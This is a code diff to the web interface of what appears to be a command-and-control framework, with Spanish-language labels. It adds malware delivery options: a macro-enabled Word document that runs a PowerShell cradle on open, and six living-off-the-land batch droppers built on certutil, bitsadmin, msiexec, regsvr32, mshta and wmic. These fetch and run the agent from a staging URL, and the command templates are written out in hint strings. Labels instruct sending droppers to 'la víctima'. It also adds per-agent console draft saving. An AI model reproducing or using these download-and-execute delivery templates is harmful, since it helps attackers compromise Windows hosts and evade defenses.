@@ -1038,9 +1038,13 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                     <option value="jscript">JScript (.js) — wscript</option>
                     <option value="vbscript">VBScript (.vbs) — wscript</option>
                     <option value="sct">SCT — regsvr32 /i</option>
+                    <option value="docm">DOCM — Word macro (AutoOpen)</option>
                   </optgroup>
                   <optgroup label="Sin staging">
                     <option value="html">HTML smuggling (EXE embebido + autodownload)</option>
+                  </optgroup>
+                  <optgroup label="LOLBin (requiere Staging URL)">
+                    <option value="lolbin">LOLBin — certutil/bitsadmin/msiexec/regsvr32/mshta/wmic</option>
                   </optgroup>
                 </select>
               </div>
@@ -3052,6 +3056,7 @@ let consoleHistIdx  = {};        // agentID → int
 let ishellState     = {};        // agentID → {kind:'cmd'|'ps', active:true}
 let consoleTabs     = [];        // ordered list of open agentIDs
 let consoleOutputs  = {};        // agentID → DocumentFragment (saved DOM)
+let consoleDrafts   = {};        // agentID → string (unsent input draft)
 let consoleCleared  = new Set(); // agentIDs whose console was explicitly cleared (persist across tab close/reopen)
 let sseSource = null;
 let sseReconnecting = false;
@@ -7202,12 +7207,14 @@ function switchConsoleTab(id) {
   // Ensure console view is shown (user may be coming from FX/AI tab)
   fxShowView('console');
 
-  // Save current output DOM — use consoleShownAgentId (not activeAgent, which may differ)
+  // Save current output DOM and input draft — use consoleShownAgentId (not activeAgent, which may differ)
   if (consoleShownAgentId) {
     const frag = document.createDocumentFragment();
     const out = document.getElementById('console-output');
     while (out.firstChild) frag.appendChild(out.firstChild);
     consoleOutputs[consoleShownAgentId] = frag;
+    const ci = document.getElementById('console-input');
+    if (ci) consoleDrafts[consoleShownAgentId] = ci.value;
     consoleShownAgentId = null;
   }
 
@@ -7231,8 +7238,9 @@ function switchConsoleTab(id) {
   // Update prompt
   document.getElementById('console-prompt-label').textContent =
     `${a.id.substring(0,8)} »`;
-  document.getElementById('console-input').value = '';
-  document.getElementById('console-input').focus();
+  const ciEl = document.getElementById('console-input');
+  ciEl.value = consoleDrafts[id] || '';
+  ciEl.focus();
   ishellUpdateUI(id);
   acRefreshFiles();
   acRefreshBofs();
@@ -7986,6 +7994,7 @@ function consoleKey(e) {
     consoleHistory[id] = hist.slice(-100);
     consoleHistIdx[id] = hist.length;
     input.value = '';
+    consoleDrafts[id] = '';
     addConsoleCommand(cmd);
     dispatchConsoleCmd(id, cmd);
   } else if (e.key === 'ArrowUp') {
@@ -11183,14 +11192,12 @@ function setImplantLang(lang) {
   }
 }
 
-// Returns the user's preferred agent lang, with optional override for SMB
-// (Rust/C don't have SMB transport yet — fall back to nim for those builds).
+// Returns the user's preferred agent lang, with optional override for SMB.
 function preferredLang(forTransport, parentLang) {
   let lang = parentLang || 'nim';
   if (!parentLang) {
     try { lang = localStorage.getItem('eg_agent_lang') || 'nim'; } catch(_) {}
   }
-  if (lang === 'rust' && forTransport === 'smb') return 'go';
   return lang;
 }
 
@@ -11223,6 +11230,8 @@ const _dlvFmtHints = {
   vbscript: 'VBScript (.vbs) con CreateObject(\"WScript.Shell\"). Compatible con cualquier Windows moderno.',
   sct:      'Scriptlet COM (.sct). Se registra y ejecuta via: regsvr32 /s /n /u /i:&lt;URL&gt; scrobj.dll',
   html:     'EXE del agente embebido en base64 dentro del HTML. Al abrir, JS hace auto-download. No necesita Stage URL — el agente va dentro del archivo.',
+  docm:     'Word macro-enabled document (.docm). AutoOpen + Document_Open ejecutan un PS cradle via WScript.Shell. Requiere que la víctima habilite macros.',
+  lolbin:   'Genera 6 .bat independientes (certutil, bitsadmin, msiexec, regsvr32, mshta, wmic) que descargan y ejecutan el agente desde la Staging URL. Sin PowerShell.',
 };
 
 function setDeliveryFmt(fmt) {
@@ -12238,15 +12247,23 @@ function renderBuildResult(container, data) {
     vbs:'VBScript dropper — enviar a la víctima',
     sct:'Scriptlet SCT — alojar en servidor, invocar con regsvr32',
     wsf:'Windows Script File — enviar a la víctima',
+    docm:'Word DOCM — enviar a la víctima (requiere Enable Macros)',
     bin_stage:'Stage URL — ya activa en el C2 (no subir manualmente)',
     runner_stage:'Stage URL runner DLL — ya activa en el C2',
     ps1_stage:'Stage URL loader PS1 — ya activa en el C2 (el LNK la descarga automáticamente)',
+    exe_stage:'Stage URL EXE — LOLBin la descarga directamente',
+    certutil:'LOLBin BAT — certutil -urlcache -split -f … (descarga+exec sin PS)',
+    bitsadmin:'LOLBin BAT — bitsadmin /transfer … (descarga+exec sin PS)',
+    msiexec:'LOLBin BAT — msiexec /q /i <URL> (instala MSI remoto)',
+    regsvr32:'LOLBin BAT — regsvr32 /s /n /u /i:<URL> scrobj.dll',
+    mshta:'LOLBin BAT — mshta.exe <URL>',
+    wmic:'LOLBin BAT — wmic os get /format:<URL>',
   };
   const ext2icon = {exe:'🪟',dll:'📦',bin:'💉',enc:'🔒',stub:'🔧',
                     lnk:'🔗',iso:'💿',hta:'🌐',html:'🌐',linux:'🐧',macho:'🍎'};
 
   // Stage URLs first, files second
-  const stageKeys = ['bin_stage','runner_stage'];
+  const stageKeys = ['bin_stage','runner_stage','exe_stage'];
   const fileKeys  = Object.keys(data).filter(k => !stageKeys.includes(k));
   const ordered   = [...stageKeys.filter(k => data[k]), ...fileKeys];
 
